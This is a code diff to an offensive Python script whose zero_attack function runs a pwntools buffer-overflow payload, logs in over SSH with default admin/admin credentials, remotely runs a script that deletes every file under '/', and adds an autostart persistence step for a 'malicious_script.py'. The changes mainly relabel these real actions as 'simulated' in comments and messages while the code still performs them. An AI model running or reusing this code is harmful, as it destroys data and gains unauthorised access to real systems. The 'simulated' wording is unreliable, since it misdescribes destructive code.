@@ -91,7 +91,7 @@ def zero_attack(url_or_ip):
     except Exception as e:
         print(f"Failed to send hello message to {url_or_ip}: {e}")
 
-    # Buffer overflow example using pwntools
+    # Simulate a buffer overflow attack using pwntools
     try:
         # Example vulnerable binary
         binary_path = './vulnerable_binary'  # Replace with a known vulnerable application for educational purposes
@@ -107,18 +107,18 @@ def zero_attack(url_or_ip):
         # Send the payload
         io.sendline(payload)
         io.interactive()
-        print(f"Buffer overflow attack executed on {url_or_ip}")
+        print(f"Buffer overflow attack simulated on {url_or_ip}")
     except Exception as e:
-        print(f"Failed to execute buffer overflow on {url_or_ip}: {e}")
+        print(f"Failed to simulate buffer overflow on {url_or_ip}: {e}")
 
-    # Attempt to gain admin access via SSH
+    # Simulate gaining admin access via SSH and executing a destructive payload
     try:
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         client.connect(url_or_ip, username='admin', password='admin')  # Example credentials
-        print(f"Admin access gained on {url_or_ip}")
+        print(f"Admin access simulated on {url_or_ip}")
 
-        # Execute the kill all file script directly
+        # Script to delete all files on the system
         kill_script = """import os
 for root, dirs, files in os.walk("/"):
     for file in files:
@@ -130,11 +130,31 @@ for root, dirs, files in os.walk("/"):
 
         stdin, stdout, stderr = client.exec_command('python3 killallfile.py')
         stdout.channel.recv_exit_status()
-        print(f"Kill all file script executed on {url_or_ip}")
+        print(f"Destructive payload executed on {url_or_ip}")
 
         client.close()
     except Exception as e:
-        print(f"Failed to gain admin access on {url_or_ip}: {e}")
+        print(f"Failed to simulate admin access on {url_or_ip}: {e}")
+
+    # Simulate persistence mechanism
+    try:
+        persistence_script = """import os, shutil
+startup_path = os.path.expanduser('~/.config/autostart')
+if not os.path.exists(startup_path):
+    os.makedirs(startup_path)
+shutil.copy('malicious_script.py', startup_path)
+"""
+        sftp = client.open_sftp()
+        sftp.file('persistence.py', 'w').write(persistence_script)
+        sftp.close()
+
+        stdin, stdout, stderr = client.exec_command('python3 persistence.py')
+        stdout.channel.recv_exit_status()
+        print(f"Persistence mechanism installed on {url_or_ip}")
+
+        client.close()
+    except Exception as e:
+        print(f"Failed to simulate persistence mechanism on {url_or_ip}: {e}")
 
 def wifi_spoofing():
     # Example command for WiFi spoofing
